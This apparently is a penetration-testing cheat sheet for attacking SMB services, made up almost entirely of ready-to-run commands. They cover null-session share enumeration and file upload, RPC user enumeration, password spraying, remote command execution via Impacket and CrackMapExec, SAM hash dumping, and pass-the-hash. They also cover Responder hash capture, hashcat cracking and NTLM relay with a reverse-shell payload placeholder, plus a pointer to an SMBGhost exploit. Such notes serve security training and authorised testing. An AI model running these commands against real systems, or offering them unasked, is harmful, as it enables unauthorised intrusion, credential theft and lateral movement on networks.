## Attacking SMB
```bash
sudo nmap 10.129.14.128 -sV -sC -p139,445

## Misconfigurations
#### Anonymous Authentication (null session)
smbclient -N -L //10.129.14.128 # list shares
smbmap -H 10.129.14.128 # show the files permission
smbmap -H 10.129.14.128 --download "notes\note.txt" # download file
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt" # upload file on write permission path

#### Remote Procedure Call (RPC)
rpcclient -U'%' 10.10.110.17 # connect
rpcclient $> enumdomusers # list users

# enum4linux
./enum4linux-ng.py 10.10.11.45 -A -C # anum all
---------------------------------------------------------------------------
## Protocol Specific Attacks

### Brute Forcing / Password Spray
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth  
# --local-auth = Target local accounts, not domain.

---------------------------------
### SMB Attacks

#### Remote Code Execution (RCE)
Impacket PsExec      # Runs commands via RemComSvc (like PsExec).  
Impacket SMBExec     # No service needed, outputs to local SMB share.  
Impacket atexec      # Uses Task Scheduler to run commands.  
CrackMapExec         # Automates smbexec and atexec over SMB.  
Metasploit PsExec    # Ruby PsExec, runs as SYSTEM via Meterpreter.

#### Impacket PsExec Examples
impacket-psexec administrator:'Password123!'@10.10.110.17        # Local  
impacket-psexec domain/administrator:'Password123!'@10.10.110.17 # Domain   
# Same syntax applies to impacket-smbexec and impacket-atexec

####  CrackMapExec
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec  
# If it fails, try: --exec-method atexec

crackmapexec smb 10.10.110.0/24 -u Administrator -p 'Password123!' --loggedon-users  
# Same local admin creds = enum logged-on users across network.

crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' --sam  
# Dump hashes from SAM database.

crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE  
# Pass-the-Hash (PtH)

----------------------------------
### Forced Authentication Attacks
  
# creating a fake SMB Server to capture users' NetNTLM v1/v2 hashes.
responder -I <interface name> #=> hash store in: /usr/share/responder/logs/

# 1- crack the hash 
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt # 1-crack the hash or:

# 2-relay the captured hash using impacket-ntlmrelayx or Responder MultiRelay.py
cat /etc/responder/Responder.conf | grep 'SMB =' # first change SMB = Off
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146 # dump sam if we have priv
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <shell> # get reverse shell'
------------------------------------------------------------------------------
### RPC
https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf #Cheat Sheet
```

##  Latest SMB Vulnerabilities

```bash
# SMBGhost (CVE-2020-0796) : unauthenticated RCE
# version : SMB v3.1.1 () Windows 10 versions 1903 and 1909)  

poc : https://www.exploit-db.com/exploits/48537
```
